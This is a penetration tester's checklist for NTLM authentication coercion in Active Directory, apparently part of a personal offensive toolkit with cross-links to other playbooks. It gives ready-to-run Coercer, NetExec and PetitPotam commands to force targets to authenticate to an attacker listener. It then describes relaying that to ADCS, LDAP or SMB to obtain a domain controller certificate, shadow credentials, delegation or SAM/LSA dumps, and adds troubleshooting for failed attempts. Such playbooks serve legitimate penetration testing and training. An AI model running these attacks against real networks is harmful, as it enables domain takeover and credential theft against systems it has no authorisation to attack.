# Coercion

- [ ] Not on the OSCP exam: coercion is kept out as a safe reading; OffSec's pages do not name it

## Before I start
- [ ] The listener chosen first: a relay, :Pb ntlm-relay, or a capture, :Pb responder
- [ ] Any domain credential works for every method here: no administrator on the target is needed
At the pwn-broker prompt: tool install netexec. Coercer comes from Kali, with sudo apt install -y coercer.

## What the target can be coerced with
coercer scan -t <TargetIP> -u '<Username>' -p '<Password>' -d <Domain>
nxc smb <TargetIP> -u '<Username>' -p '<Password>' -M coerce_plus
- [ ] The spooler running: PrinterBug; the DFS service: DFSCoerce; file server shadow copies, FSRVP: ShadowCoerce; EFS: PetitPotam, which works almost everywhere

## Fire
coercer coerce -l <LHOST> -t <TargetIP> -u '<Username>' -p '<Password>' -d <Domain>
nxc smb <TargetIP> -u '<Username>' -p '<Password>' -M coerce_plus -o LISTENER=<LHOST>
nxc smb <TargetIP> -u '<Username>' -p '<Password>' -M petitpotam -o LISTENER=<LHOST>
PetitPotam.py, from https://github.com/topotam/PetitPotam, takes the listener first and the target second:
git clone https://github.com/topotam/PetitPotam
python3 PetitPotam/PetitPotam.py -u '<Username>' -p '<Password>' -d '<Domain>' <LHOST> <TargetIP>
- [ ] HTTP in place of SMB, from a workstation with the WebClient service running: the listener given as THE-KALI-NAME@80/x, a name that resolves to Kali and not its IP

## What it gives
- [ ] A DC coerced and relayed to ADCS web enrolment: a certificate as the DC, and with it the domain: :Pb adcs
- [ ] A DC coerced and relayed to LDAP or LDAPS: shadow credentials or resource-based constrained delegation as the DC's account: :Pb shadow-credentials, :Pb delegation
- [ ] A host coerced and relayed to SMB where signing is off: SAM and LSA as its machine account
- [ ] Coerced into a capture: a machine account's NetNTLMv2 response, which is not worth cracking and is only for relay

## If it fails
- [ ] Patches since 2021 stopped PetitPotam with no login; with a login it still works: the credential checked on SMB first
- [ ] A method the build does not support: PetitPotam, PrinterBug, DFSCoerce and ShadowCoerce in turn, as Coercer's scan lists them
- [ ] Nothing arrived: a firewall between the target and me, or the listener on the wrong interface

## Next
- [ ] The relay finished: :Pb ntlm-relay
- [ ] Coerced service accounts looked up in BloodHound for the next path: :Pb domain-enum
